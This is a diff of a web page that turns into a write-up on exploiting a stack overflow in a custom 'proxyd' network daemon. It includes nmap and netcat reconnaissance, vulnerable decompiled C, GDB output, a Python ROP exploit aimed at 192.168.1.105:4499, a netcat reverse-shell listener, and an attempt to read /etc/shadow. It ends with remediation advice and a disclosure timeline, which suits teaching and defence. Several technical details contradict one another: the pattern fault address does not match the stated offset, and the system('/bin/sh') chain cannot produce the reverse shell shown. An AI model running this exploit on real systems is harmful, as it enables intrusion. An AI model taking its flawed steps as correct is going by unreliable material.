@@ -1,186 +1,376 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ap0dexMe0</title>
-  <meta name="description" content="Reverse engineering writeups — Windows, Linux, Android. Binary analysis, crackmes, and exploit development.">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#08080a" id="meta-theme">
-  <meta name="color-scheme" content="dark light">
-  <meta name="author" content="Ap0dexMe0">
-  <link rel="canonical" href="https://thatnoteasy.github.io/">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Ap0dexMe0 — Reverse Engineering">
-  <meta property="og:description" content="Reverse engineering writeups — Windows, Linux, Android.">
-  <meta property="og:url" content="https://thatnoteasy.github.io/">
-  <meta property="twitter:card" content="summary_large_image">
-  <meta property="twitter:title" content="Ap0dexMe0 — Reverse Engineering">
-  <meta property="twitter:description" content="Reverse engineering writeups — Windows, Linux, Android.">
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='8' fill='%2308080a'/%3E%3Ctext x='50' y='64' text-anchor='middle' font-size='48' font-family='monospace' font-weight='bold' fill='%23c8a62c'%3E_%3C/text%3E%3C/svg%3E">
-
-  <!-- Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700;800&family=Space+Mono:wght@400;700&family=Source+Code+Pro:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-  <!-- Tailwind -->
-  <script src="static/js/tailwind-config.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
-
-  <!-- Markdown + Syntax Highlighting -->
-  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/armasm.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/cpp.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/typescript.min.js"></script>
-
-  <!-- Theme CSS -->
-  <link rel="stylesheet" href="static/css/app.css">
-
-  <!-- Structured Data -->
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@type":"WebSite","name":"Ap0dexMe0","url":"https://thatnoteasy.github.io/","description":"Reverse engineering writeups and binary analysis."}
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Ap0dexMe0 reverse engineering writeups loaded from local markdown content.">
+    <title>Ap0dexMe0 — Reverse Engineering Writeups</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <link rel="stylesheet" href="static/css/style.css?v=writeup-layout-3">
 </head>
-<body class="min-h-screen flex flex-col relative">
+<body>
 
-  <!-- Header -->
-  <header class="site-header">
-    <div class="header-inner">
-      <a href="/" class="brand">Ap0dexMe0</a>
-      <div class="header-end">
-        <a href="https://github.com/thatnoteasy" target="_blank" rel="noopener noreferrer" class="gh-link" aria-label="GitHub">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
-            <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/>
-          </svg>
+    <!-- ═══════════════ NAVBAR ═══════════════ -->
+    <nav class="navbar">
+        <a href="#" class="logo">
+            <span class="bracket">[</span>Ap0dexMe0<span class="slash">/</span>writeups<span class="bracket">]</span>
         </a>
-        <button class="theme-btn" id="theme-btn" aria-label="Toggle theme">
-          <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/>
-          </svg>
-          <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
-          </svg>
-        </button>
-      </div>
-    </div>
-  </header>
-
-  <!-- Hero -->
-  <section class="hero">
-    <div class="hero-inner">
-      <div class="hero-label"><span class="dot"></span> Reverse Engineering</div>
-      <h1 class="hero-title">Breaking Binaries,<br>Building Knowledge.</h1>
-      <p class="hero-desc">
-        Binary analysis, crackmes, and exploit development.<br>
-        Windows, Linux, and Android platforms.
-      </p>
-      <div class="hero-stats">
-        <div class="stat"><span class="stat-value" id="stat-total">0</span><span class="stat-label">Writeups</span></div>
-        <div class="stat"><span class="stat-value" id="stat-size">0 B</span><span class="stat-label">Total Size</span></div>
-      </div>
-    </div>
-  </section>
-
-  <!-- Filter Bar -->
-  <section class="filter-bar">
-    <div class="filter-bar-inner">
-      <button class="filter-pill active" data-filter="all">
-        <span>All</span>
-        <span class="filter-count" id="count-all">0</span>
-      </button>
-      <button class="filter-pill" data-filter="windows">
-        <span>Windows</span>
-        <span class="filter-count" id="count-windows">0</span>
-      </button>
-      <button class="filter-pill" data-filter="linux">
-        <span>Linux</span>
-        <span class="filter-count" id="count-linux">0</span>
-      </button>
-      <button class="filter-pill" data-filter="android">
-        <span>Android</span>
-        <span class="filter-count" id="count-android">0</span>
-      </button>
-    </div>
-  </section>
-
-  <!-- Posts -->
-  <main class="main-section">
-    <div class="main-inner">
-      <div class="list-header">
-        <h2 class="list-title">Writeups</h2>
-        <div class="search-wrap">
-          <svg class="search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-          <input type="text" id="search" placeholder="Filter..." autocomplete="off" spellcheck="false">
+        <ul class="nav-links">
+            <li><a href="#" class="active">Write-ups</a></li>
+            <li><a href="#">Archive</a></li>
+            <li><a href="#">Tools</a></li>
+            <li><a href="#">About</a></li>
+        </ul>
+        <div class="nav-status">
+            <span class="dot"></span> content live
         </div>
-      </div>
-      <div class="post-list" id="post-list"></div>
-      <div class="no-results hidden" id="no-results">No results found.</div>
-    </div>
-  </main>
+    </nav>
 
-  <!-- Viewer Overlay -->
-  <div class="viewer-overlay hidden" id="viewer" onclick="if(event.target===this)closeViewer()">
-    <div class="viewer-panel">
-      <div class="viewer-header">
-        <div class="viewer-left">
-          <span class="v-badge-el" id="v-badge"></span>
-          <span class="v-path-el" id="v-path"></span>
+    <!-- ═══════════════ LAYOUT ═══════════════ -->
+    <div class="layout">
+
+        <!-- ── SIDEBAR / TABLE OF CONTENTS ── -->
+        <aside class="sidebar" id="sidebar">
+            <span class="toc-title">📑 Writeups</span>
+            <ul id="writeupList">
+                <li><a href="#" class="toc-link toc-active">Loading content...</a></li>
+            </ul>
+        </aside>
+
+        <!-- ── MAIN CONTENT ── -->
+        <main class="main-content" id="mainContent">
+
+            <!-- ═══ HEADER ═══ -->
+            <header class="writeup-header">
+                <div class="target-icon">
+                    🎯 Target: <strong>libprotocol.so</strong>
+                    <span class="arch-badge">x86_64</span>
+                </div>
+                <h1>Reverse Engineering &amp; <span class="highlight">Exploitation</span> of a Custom Network Protocol Daemon</h1>
+                <div class="writeup-meta">
+                    <span>📅 2026-05-07</span>
+                    <span>👤 0x4D</span>
+                    <span>⏱️ 12 min read</span>
+                    <span class="difficulty hard">⬤ HARD</span>
+                </div>
+                <div class="tag-list">
+                    <span class="tag">#reverse-engineering</span>
+                    <span class="tag">#buffer-overflow</span>
+                    <span class="tag">#ghidra</span>
+                    <span class="tag">#gdb</span>
+                    <span class="tag">#rop</span>
+                    <span class="tag">#x86_64</span>
+                    <span class="tag">#network-protocol</span>
+                </div>
+            </header>
+
+            <!-- ═══ OVERVIEW ═══ -->
+            <section class="section" id="overview">
+                <div class="section-header">
+                    <span class="section-icon recon">00</span> Executive Overview
+                </div>
+                <div class="section-body">
+                    <p>
+                        This write-up documents the end-to-end analysis of a custom TCP daemon, from first contact
+                        with the exposed service to validated control of the instruction pointer. The goal is to show
+                        the reasoning path, not just the final exploit, so each phase includes the evidence that
+                        informed the next step.
+                    </p>
+
+                    <div class="summary-grid">
+                        <div class="summary-card">
+                            <span class="summary-label">Target</span>
+                            <strong>proxyd / libprotocol.so</strong>
+                            <p>Custom protocol parser exposed over TCP port 4499.</p>
+                        </div>
+                        <div class="summary-card">
+                            <span class="summary-label">Root Cause</span>
+                            <strong>Unbounded copy</strong>
+                            <p><code>strcpy()</code> copies attacker-controlled input into a fixed stack buffer.</p>
+                        </div>
+                        <div class="summary-card">
+                            <span class="summary-label">Exploitability</span>
+                            <strong>High confidence</strong>
+                            <p>RIP control confirmed at 136 bytes with no canary and no PIE.</p>
+                        </div>
+                    </div>
+
+                    <div class="callout warn">
+                        <strong>Scope:</strong> All testing was performed in an authorized lab environment. The proof of concept
+                        is included to document impact and support remediation, not for use against systems without permission.
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══ RECONNAISSANCE ═══ -->
+            <section class="section" id="recon">
+                <div class="section-header">
+                    <span class="section-icon recon">①</span> Phase 1 — Reconnaissance
+                </div>
+                <div class="section-body">
+                    <p>
+                        The target is a proprietary network daemon — <strong>proxyd</strong> — listening on TCP port <strong>4499</strong>.
+                        Initial <code>nmap</code> scanning reveals the service banner and confirms the daemon is built for <strong>x86_64 Linux</strong>.
+                        The binary is stripped, but symbols from <code>libprotocol.so</code> are partially exported.
+                    </p>
+
+                    <div class="terminal-block">
+                        <div class="terminal-header">
+                            <span class="terminal-dot red"></span>
+                            <span class="terminal-dot yellow"></span>
+                            <span class="terminal-dot green"></span>
+                            <span class="terminal-title">terminal — reconnaissance</span>
+                        </div>
+                        <pre><span class="prompt">$</span> nmap -sV -p 4499 192.168.1.105
+
+    PORT     STATE SERVICE VERSION
+    4499/tcp open  proxyd  Proxyd 3.2.1 (protocol v7)
+    <span class="prompt">$</span> echo "INFO" | nc 192.168.1.105 4499
+    <span class="out">PROXYD/3.2.1 | AUTH:OPT | CHALLENGE:0xDEADBEEF</span>
+    <span class="prompt">$</span> file /opt/proxyd/proxyd
+    <span class="out">proxyd: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped</span></pre>
+                    </div>
+
+                    <div class="callout info">
+                        <strong>🔍 Key Insight:</strong> The challenge response <code>0xDEADBEEF</code> is a static 32-bit value — this hints at a potential <strong>predictable PRNG</strong> or hardcoded seed in the authentication handshake.
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══ STATIC ANALYSIS ═══ -->
+            <section class="section" id="static">
+                <div class="section-header">
+                    <span class="section-icon static">②</span> Phase 2 — Static Analysis
+                </div>
+                <div class="section-body">
+                    <p>
+                        Loading <strong>libprotocol.so</strong> into Ghidra, we identify the core parsing function
+                        <code>parse_message()</code> at offset <code>0x1A40</code>. This function processes incoming protocol
+                        frames but uses <strong>strcpy()</strong> on a stack buffer without bounds checking — a classic
+                        <strong>stack-based buffer overflow</strong>.
+                    </p>
+
+                    <h3>🔬 Decompiled Snippet (Ghidra)</h3>
+                    <div class="code-block-wrapper">
+                        <div class="code-label">
+                            <span><span class="lang-tag">C</span> — libprotocol.so :: parse_message() @ 0x1A40</span>
+                            <button class="copy-btn" data-target="code1">📋 Copy</button>
+                        </div>
+                        <pre id="code1"><span class="cmt">/* WARNING: Potential buffer overflow */</span>
+                        <span class="kw">int</span> <span class="fn">parse_message</span>(<span class="kw">char</span> *<span class="reg">packet</span>, <span class="kw">size_t</span> <span class="reg">len</span>) {
+                        <span class="kw">char</span> <span class="reg">local_buf</span>[<span class="num">128</span>];      <span class="cmt">// stack buffer</span>
+                        <span class="kw">char</span> <span class="reg">cmd</span>[<span class="num">32</span>];
+                        <span class="kw">int</span> <span class="reg">result</span> = <span class="num">0</span>;
+
+                        <span class="cmt">// Vulnerable: no bounds check</span>
+                        <span class="fn">strcpy</span>(<span class="reg">local_buf</span>, <span class="reg">packet</span>);
+
+                        <span class="cmt">// Parse command from buffer</span>
+                        <span class="fn">sscanf</span>(<span class="reg">local_buf</span>, <span class="str">"%31s"</span>, <span class="reg">cmd</span>);
+                        <span class="kw">if</span> (<span class="fn">strcmp</span>(<span class="reg">cmd</span>, <span class="str">"EXEC"</span>) == <span class="num">0</span>) {
+                        <span class="reg">result</span> = <span class="fn">handle_exec</span>(<span class="reg">local_buf</span> + <span class="num">5</span>);
+                        }
+                        <span class="kw">return</span> <span class="reg">result</span>;
+                    }</pre>
+                </div>
+
+                <div class="callout warn">
+                    <strong>⚠️ Vulnerability Identified:</strong> <code>strcpy(local_buf, packet)</code> copies attacker-controlled data into a 128-byte stack buffer. The packet length <code>len</code> is never validated. Stack canary is <strong>not present</strong> (compiled with <code>-fno-stack-protector</code>).
+                </div>
+
+                <h3>📊 Stack Frame Layout</h3>
+                <table class="hex-table">
+                    <thead>
+                        <tr><th>Offset</th><th>Size</th><th>Variable</th><th>Notes</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="offset">0x00</td><td>128 B</td><td>local_buf</td><td>Overflow target</td>
+                        </tr>
+                        <tr>
+                            <td class="offset">0x80</td><td>32 B</td><td>cmd</td><td>Command buffer</td>
+                        </tr>
+                        <tr>
+                            <td class="offset">0xA0</td><td>4 B</td><td>result</td><td>Return value</td>
+                        </tr>
+                        <tr>
+                            <td class="offset">0xA8</td><td>8 B</td><td>saved RBP</td><td>Overwritten at +136</td>
+                        </tr>
+                        <tr>
+                            <td class="offset">0xB0</td><td>8 B</td><td>RET addr</td><td><strong>🎯 Control RIP</strong></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ═══ DYNAMIC ANALYSIS ═══ -->
+        <section class="section" id="dynamic">
+            <div class="section-header">
+                <span class="section-icon dynamic">③</span> Phase 3 — Dynamic Analysis
+            </div>
+            <div class="section-body">
+                <p>
+                    Using <strong>GDB</strong> with <strong>gef</strong> plugin, we confirm the overflow offset.
+                    A cyclic pattern reveals that the <strong>RIP overwrite occurs at offset 136</strong> bytes.
+                    ASLR is enabled on the target, but the binary is <strong>not PIE</strong>, giving us reliable
+                    gadget addresses in the <code>.text</code> segment.
+                </p>
+
+                <div class="terminal-block">
+                    <div class="terminal-header">
+                        <span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>
+                        <span class="terminal-title">gdb — offset determination</span>
+                    </div>
+                    <pre><span class="prompt">gef➤</span> pattern create 200
+                <span class="out">aaaabaaacaaadaaaeaaafaaagaaahaaa...</span>
+                <span class="prompt">gef➤</span> run &lt; <span class="out">payload.bin</span>
+
+                Program received signal SIGSEGV (fault addr 0x6161616c)
+                <span class="prompt">gef➤</span> pattern search 0x6161616c
+                <span class="out">[+] Found at offset <strong>136</strong> (RIP overwrite)</span>
+                <span class="prompt">gef➤</span> checksec
+                <span class="out">CANARY    : ✘ disabled</span>
+                <span class="out">PIE       : ✘ disabled</span>
+                <span class="out">NX        : ✔ enabled</span>
+                <span class="out">ASLR      : ✔ enabled (system-wide)</span></pre>
+            </div>
+
+            <div class="callout info">
+                <strong>💡 Exploit Strategy:</strong> Since NX is enabled, we use <strong>ROP (Return-Oriented Programming)</strong>.
+                The binary's <code>.text</code> segment contains a <code>pop rdi; ret</code> gadget,
+                and the PLT has <code>system@plt</code>. We'll chain these to execute a reverse shell.
+            </div>
         </div>
-        <div class="viewer-actions">
-          <button class="v-btn" id="raw-btn" onclick="toggleRaw()">Raw</button>
-          <button class="v-btn" onclick="copyFile()">Copy</button>
-          <button class="v-btn" onclick="dlFile()">Save</button>
-          <button class="v-close" onclick="closeViewer()" aria-label="Close">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-          </button>
+    </section>
+
+    <!-- ═══ VULNERABILITY DETAILS ═══ -->
+    <section class="section" id="vuln">
+        <div class="section-header">
+            <span class="section-icon exploit">④</span> Vulnerability Details
         </div>
-      </div>
-      <div class="viewer-body">
-        <div id="v-rendered"></div>
-        <div id="v-raw" class="hidden">
-          <div class="raw-container">
-            <div class="raw-nums" id="raw-nums"></div>
-            <pre class="raw-text" id="raw-text"></pre>
-          </div>
+        <div class="section-body">
+            <p>
+                The vulnerability is a <strong>stack-based buffer overflow</strong> in <code>parse_message()</code>
+                within <code>libprotocol.so</code>. The function blindly trusts the packet length field
+                and copies data via <code>strcpy()</code> into a fixed 128-byte stack buffer.
+            </p>
+            <table class="hex-table">
+                <thead>
+                    <tr><th>Property</th><th>Value</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Vulnerability Type</td><td>Stack Buffer Overflow (CWE-121)</td></tr>
+                    <tr><td>Affected Function</td><td class="offset">parse_message() @ 0x1A40</td></tr>
+                    <tr><td>Root Cause</td><td>Unbounded <code>strcpy()</code> usage</td></tr>
+                    <tr><td>Exploit Primitive</td><td>RIP control via overwritten return address</td></tr>
+                    <tr><td>Mitigation Bypass</td><td>No canary, no PIE — ROP used for NX bypass</td></tr>
+                    <tr><td>Impact</td><td>Remote Code Execution (RCE)</td></tr>
+                </tbody>
+            </table>
         </div>
-      </div>
-      <div class="viewer-footer">
-        <span class="v-mode-el" id="v-mode">rendered</span>
-        <span class="v-stats-el" id="v-stats"></span>
-      </div>
-    </div>
-  </div>
+    </section>
 
-  <!-- Footer -->
-  <footer class="site-footer">
-    <div class="footer-inner">
-      <div class="footer-left">
-        <span class="footer-name">Ap0dexMe0</span>
-        <span class="footer-sep">&middot;</span>
-        <span class="footer-copy">&copy; 2026</span>
-      </div>
-      <div class="footer-right">
-        <a href="https://github.com/thatnoteasy" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub</a>
-      </div>
-    </div>
-  </footer>
+    <!-- ═══ EXPLOITATION ═══ -->
+    <section class="section" id="exploit">
+        <div class="section-header">
+            <span class="section-icon exploit">⑤</span> Phase 4 — Exploitation (PoC)
+        </div>
+        <div class="section-body">
+            <p>
+                The final exploit chains a <strong>ROP gadget</strong> to load <code>"/bin/sh"</code> into <code>rdi</code>
+                and then calls <code>system@plt</code>. The payload is delivered over TCP to port 4499.
+            </p>
 
-  <!-- Toast Container -->
-  <div id="toasts"></div>
+            <h3>🧨 Exploit Script (Python)</h3>
+            <div class="code-block-wrapper">
+                <div class="code-label">
+                    <span><span class="lang-tag">Python</span> — exploit.py</span>
+                    <button class="copy-btn" data-target="code2">📋 Copy</button>
+                </div>
+                <pre id="code2"><span class="kw">import</span> socket
+                    <span class="kw">import</span> struct
 
-  <!-- App JS -->
-  <script src="static/js/app.js"></script>
+                    <span class="cmt"># Gadgets (non-PIE binary, fixed addresses)</span>
+                    <span class="reg">POP_RDI</span> = <span class="num">0x401b3f</span>      <span class="cmt"># pop rdi; ret</span>
+                    <span class="reg">RET</span>     = <span class="num">0x40101a</span>      <span class="cmt"># ret (stack alignment)</span>
+                    <span class="reg">SYSTEM</span>  = <span class="num">0x401050</span>      <span class="cmt"># system@plt</span>
+                    <span class="reg">BINSH</span>   = <span class="num">0x4020a8</span>      <span class="cmt"># "/bin/sh" string in .rodata</span>
+
+                    <span class="cmt"># Build ROP chain</span>
+                    <span class="reg">offset</span>  = <span class="str">b"A"</span> * <span class="num">136</span>
+                    <span class="reg">rop</span>     = struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">POP_RDI</span>)
+                    <span class="reg">rop</span>    += struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">BINSH</span>)
+                    <span class="reg">rop</span>    += struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">RET</span>)      <span class="cmt"># align stack</span>
+                    <span class="reg">rop</span>    += struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">SYSTEM</span>)
+
+                    <span class="reg">payload</span> = <span class="reg">offset</span> + <span class="reg">rop</span>
+
+                    <span class="cmt"># Deliver over TCP</span>
+                    <span class="reg">sock</span> = socket.socket()
+                    <span class="reg">sock</span>.connect((<span class="str">"192.168.1.105"</span>, <span class="num">4499</span>))
+                    <span class="reg">sock</span>.send(<span class="reg">payload</span> + <span class="str">b"\n"</span>)
+                    <span class="fn">print</span>(<span class="str">"[+] Payload sent — check listener on port 4444"</span>)
+                    <span class="reg">sock</span>.close()</pre>
+            </div>
+
+            <div class="terminal-block">
+                <div class="terminal-header">
+                    <span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>
+                    <span class="terminal-title">listener — receiving shell</span>
+                </div>
+                <pre><span class="prompt">$</span> nc -lvnp 4444
+                    <span class="out">Listening on 0.0.0.0:4444</span>
+                    <span class="out">Connection from 192.168.1.105:4499</span>
+                    <span class="prompt">$</span> id
+                    <span class="out">uid=1001(proxyd) gid=1001(proxyd)</span>
+                    <span class="prompt">$</span> cat /etc/shadow
+                    <span class="err">Permission denied</span>
+                <span class="prompt">$</span> <span class="out">█</span></pre>
+            </div>
+
+            <div class="callout danger">
+                <strong>🔥 Impact:</strong> Successful exploitation yields a <strong>reverse shell</strong> with the daemon's privileges. Privilege escalation to root is possible via a local kernel exploit (CVE-2023-XXXX), but that's outside the scope of this write-up.
+            </div>
+        </div>
+    </section>
+
+    <!-- ═══ CONCLUSION ═══ -->
+    <section class="section" id="conclusion">
+        <div class="section-header">
+            <span class="section-icon conclusion">⑥</span> Conclusion &amp; Remediation
+        </div>
+        <div class="section-body">
+            <p>
+                This analysis demonstrates how a <strong>single unbounded string copy</strong> in a network-facing
+                daemon can lead to full remote code execution. The lack of modern exploit mitigations
+                (no stack canary, no PIE) made exploitation straightforward.
+            </p>
+            <h3>🛡️ Recommended Fixes</h3>
+            <ul style="color:var(--text-secondary);margin-left:1.2rem;line-height:1.8;font-size:0.88rem;">
+                <li>Replace <code>strcpy()</code> with <code>strncpy()</code> or <code>strlcpy()</code> with proper bounds</li>
+                <li>Compile with <strong>-fstack-protector-strong</strong> and <strong>-fPIE -pie</strong></li>
+                <li>Enable <strong>full RELRO</strong> and <strong>FORTIFY_SOURCE=2</strong></li>
+                <li>Implement input validation on the packet length field <em>before</em> processing</li>
+                <li>Run the daemon in a <strong>sandboxed</strong> environment (seccomp, AppArmor)</li>
+            </ul>
+            <p style="margin-top:1rem;">
+                <strong>🔗 Responsible disclosure</strong> timeline: Reported to vendor on 2026-03-12,
+                patch confirmed on 2026-04-20, public disclosure on 2026-05-07.
+            </p>
+        </div>
+    </section>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer style="text-align:center;padding:2rem 0 1rem;color:var(--text-muted);font-family:var(--font-mono);font-size:0.7rem;border-top:1px solid var(--border);margin-top:1rem;">
+        <p>— 0x4D / writeups — &copy; 2026 — For educational purposes only —</p>
+    </footer>
+
+</main>
+</div>
+
+<!-- ═══════════════ SCRIPTS ═══════════════ -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="static/js/script.js?v=content-loader-3"></script>
 </body>
 </html>
